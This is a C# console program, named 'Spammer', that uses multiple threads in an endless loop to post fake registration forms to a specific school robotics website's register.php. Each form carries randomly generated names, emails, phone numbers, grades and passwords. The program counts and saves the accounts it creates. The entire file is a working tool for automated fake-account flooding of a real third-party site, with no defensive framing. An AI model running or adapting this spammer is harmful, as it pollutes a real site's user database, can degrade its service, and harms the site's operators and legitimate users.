using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Security.Cryptography;
using Newtonsoft.Json;

namespace Spammer
{
	class Program
	{
		public static ConcurrentDictionary<String, Info> Fails;
		public static ConcurrentDictionary<String, Info> Success; 
		public static int Counter;
		public static volatile bool IsAborting = false;
		public static void Main(string[] args)
		{
			Fails = new ConcurrentDictionary<string, Info>();
			Success = new ConcurrentDictionary<string, Info>();
			Console.WriteLine("Enter the number of threads to be used");
			int numthreads = Int32.Parse(Console.ReadLine() ?? "4");
			var threads = new List<Thread>();

			for (int i = 0; i < numthreads; i++)
			{
				threads.Add(new Thread(ToBeRun));
			}
			foreach (Thread thread in threads)
			{
				thread.Start();
			}
			Console.WriteLine("Started");
			Console.ReadKey();
			IsAborting = true;
			foreach (Thread thread in threads)
			{
				thread.Join();
			}
			Console.ReadKey();
			Console.WriteLine("Enter the file name you want to write the usernames to (default is info.json):");
			Console.WriteLine("If you don't want to save the session, type: NO LO QUIERO");
			var input = Console.ReadLine();
			var filename = input ?? "info.json";
			if (filename.ToLower() == "no lo quiero")
			{
				Environment.Exit(1);
			}
			var stream = new StreamWriter(filename, true, Encoding.UTF8);
			stream.Write(JsonConvert.SerializeObject(Fails));
			stream.Write(JsonConvert.SerializeObject(Success));
			stream.Close();
			Environment.Exit(1);
		}

		public static async void ToBeRun()
		{
			var client = new HttpClient();
			var rgx = new Regex("[^a-zA-Z]");
			while (true)
			{
				var random = new Random();
				var dict = new Dictionary<String, String>();
				string name = Stringgen(9);
				dict.Add("real_name", name);
				string username = rgx.Replace(Stringgen(9), "r");
				dict.Add("user_name", username);
				string email = rgx.Replace(Stringgen(9), "a") + "@" + rgx.Replace(Stringgen(4), "b") + ".com";
				dict.Add("user_email", email);
				string grade = random.Next(9, 12).ToString(new CultureInfo("en-US"));
				dict.Add("grade", grade);
				string phonenum = Phonegen();
				dict.Add("phone_number", phonenum);
				string current = rgx.Replace(Stringgen(9), "x");
				dict.Add("user_password_new", current);
				dict.Add("user_password_repeat", current);
				dict.Add("register", "Register");
				var headers = new FormUrlEncodedContent(dict);
				try
				{
					var i = await client.PostAsync(new Uri("http://www.dvhsrobotics.com/register.php"), headers);
					var result = await i.Content.ReadAsStringAsync();
					var info = new Info(username, current, email, name, phonenum, grade);
					if (result.Contains("Your account has been created successfully"))
					{
						Counter++;
						Console.WriteLine("Success: " + Counter);
						Console.WriteLine(String.Format("Email: {0} and Username: {1}", email, username));
						Success.TryAdd(username, info);
					}
					else if (result.Contains("Sorry"))
					{
						Console.WriteLine("Exists");
						Console.WriteLine(username);
						Fails.TryAdd(username + "-tried", info);
					}
					else
					{
						Console.WriteLine("Fail");
						Console.WriteLine(String.Format("Email: {0} and Username: {1}", email, username));
						Fails.TryAdd(username, info);
					}
				}
				catch (Exception e)
				{
					var info = new Info(username, current, email, name, phonenum, grade);
					Fails.TryAdd(username, info);
				}
				if (IsAborting)
				{
					return;
				}
				Thread.Sleep(2000);
			}
		}

		public static string Stringgen(int max)
		{
			var value = new StringBuilder();
			for (int i = 0; i < max; i++)
			{
				value.Append(Charactergen());
			}
			return value.ToString();
		}
		public static string Charactergen()
		{
			var random = new RNGCryptoServiceProvider();
			var array = new byte[32];
			random.GetBytes(array); // Zero to 25
			var integer = BitConverter.ToInt32(array, 0) % 23;
			var let = (char)('a' + integer);
			return let.ToString(new CultureInfo("en-US"));
		}

		public static string Phonegen()
		{
			var random = new RNGCryptoServiceProvider();
			var num = new StringBuilder();
			for (int i = 0; i < 11; i++)
			{
				var array = new byte[32];
				random.GetBytes(array);
				var integer = BitConverter.ToInt32(array, 0) % 10;
				num.Append(integer);
			}
			return num.ToString();
		}
	}

	class Info
	{
		public string username { get; set; }
		public string password { get; set; }
		public string email { get; set; }
		public string name { get; set; }
		public string phonenum { get; set; }
		public string grade { get; set; }

		public Info(string _username, string _password, string _email, string _name, string _phonenum, string _grade)
		{
			username = _username;
			password = _password;
			email = _email;
			name = _name;
			phonenum = _phonenum;
			grade = _grade;
		}
	}
}
